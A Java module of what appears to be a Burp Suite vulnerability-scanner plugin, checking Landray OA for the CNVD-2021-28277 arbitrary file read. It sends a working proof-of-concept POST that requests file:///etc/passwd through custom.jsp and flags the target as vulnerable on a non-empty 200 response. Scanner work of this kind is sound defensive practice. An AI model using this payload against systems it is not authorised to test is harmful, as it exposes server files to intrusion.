package com.alumm0x.scan.http.task.vuls;

import java.io.IOException;
import java.nio.charset.StandardCharsets;

import org.jetbrains.annotations.NotNull;

import com.alumm0x.scan.LogEntry;
import com.alumm0x.scan.http.task.impl.VulTaskImpl;
import com.alumm0x.tree.UselessTreeNodeEntity;
import com.alumm0x.util.BurpReqRespTools;
import com.alumm0x.util.CommonStore;

import burp.IHttpRequestResponse;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

public class LandrayOa extends VulTaskImpl {
    /**
     * CNVD-2021-28277
     * 蓝凌oa任意文件读取
     * https://www.cnvd.org.cn/flaw/show/CNVD-2021-28277
     *
     */

    public static String name = "LandrayOa任意文件读取";
    public static String comments = "/sys/ui/extend/varkind/custom.jsp该接口存在任意文件读取";
    public static String fix = "升级版本,或是禁止该接口的公开访问。（https://www.cnvd.org.cn/flaw/show/CNVD-2021-28277）";

    public UselessTreeNodeEntity entity;

    public LandrayOa(UselessTreeNodeEntity entity) {
        this.entity = entity;
    }

    @Override
    public void run() {
        //新的请求包
        String poc_body = "var={\"body\":{\"file\":\"file:///etc/passwd\"}}";
   
        String url = BurpReqRespTools.getRootUrl(entity.getRequestResponse()) + "/sys/ui/extend/varkind/custom.jsp";
        CommonStore.okHttpRequester.send(url,
                "POST",
                BurpReqRespTools.getReqHeaders(entity.getRequestResponse()),
                BurpReqRespTools.getQuery(entity.getRequestResponse()),
                poc_body.getBytes(StandardCharsets.UTF_8),
                BurpReqRespTools.getContentType(entity.getRequestResponse()),
                new LandrayOaCallback(this));
    }
}

class LandrayOaCallback implements Callback {

    VulTaskImpl vulTask;
    UselessTreeNodeEntity entity;
    LogEntry logEntry;

    public LandrayOaCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
        this.entity = ((LandrayOa)vulTask).entity;
        this.logEntry = vulTask.logAddToScanLogger(entity.getCurrent(), LandrayOa.class.getSimpleName());
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        logEntry.onFailure();
        CommonStore.logModel.update();
        CommonStore.callbacks.printError("[LandrayOaCallback]" + e.getMessage());
        logEntry.Comments = e.getMessage();
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        IHttpRequestResponse requestResponse = BurpReqRespTools.makeBurpReqRespFormOkhttp(call,response, BurpReqRespTools.getHttpService(entity.getRequestResponse()));
        logEntry.requestResponse = CommonStore.callbacks.saveBuffersToTempFiles(requestResponse);
        logEntry.Status = (short) response.code();
        //如果状态码200,然后响应内容不同，则存在url鉴权绕过
        if (response.isSuccessful() && BurpReqRespTools.getRespBody(requestResponse).length > 0) {
            logEntry.hasVuln();
            entity.color = "red";
        } else {
            logEntry.onResponse();
        }
    }
}
